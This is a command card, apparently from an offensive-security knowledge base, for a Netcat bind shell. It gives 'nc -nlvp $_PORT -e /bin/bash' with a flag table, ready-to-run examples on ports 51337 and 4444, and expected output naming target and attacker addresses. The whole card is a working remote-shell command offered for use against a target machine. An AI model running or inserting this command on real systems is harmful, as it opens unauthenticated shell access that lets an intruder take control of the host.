---
type: command
executor: bash
data: nc -nlvp $_PORT -e /bin/bash
tags:
  - bind-shell
  - netcat
platforms:
  - Linux
  - Unix
verified: true
validated: true
---

# netcat-bind-shell-listener

## Command

```bash
nc -nlvp $_PORT -e /bin/bash
```

## Description

This command configures Netcat to listen on a specified port on the target machine and execute /bin/bash upon an incoming connection, creating a bind shell for remote access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -n | Do not resolve DNS (numeric only) | Yes |
| -l | Listen mode for inbound connections | Yes |
| -v | Verbose output for connection details | Yes |
| -p $_PORT | Specify the port to bind to (e.g., 51337) | Yes |
| -e /bin/bash | Execute /bin/bash on connection | Yes |
| $_PORT | The listening port number | Yes |

## Examples

### Basic Usage

```bash
nc -nlvp 51337 -e /bin/bash
```

### Advanced Usage

```bash
nc -nlvp 4444 -e /bin/sh  # Use sh if bash unavailable
```

## Expected Output

Listening on [0.0.0.0] 51337 ...
connect to [$_TARGET_IP] from (localhost) [$_ATTACKER_IP] $_ATTACKER_PORT

Upon connection, the shell prompt appears, allowing command input.

## Related

- [[procedures/Netcat-Traditional-Bind-Shell]]
- [[commands/netcat-connect-to-bind-shell]]
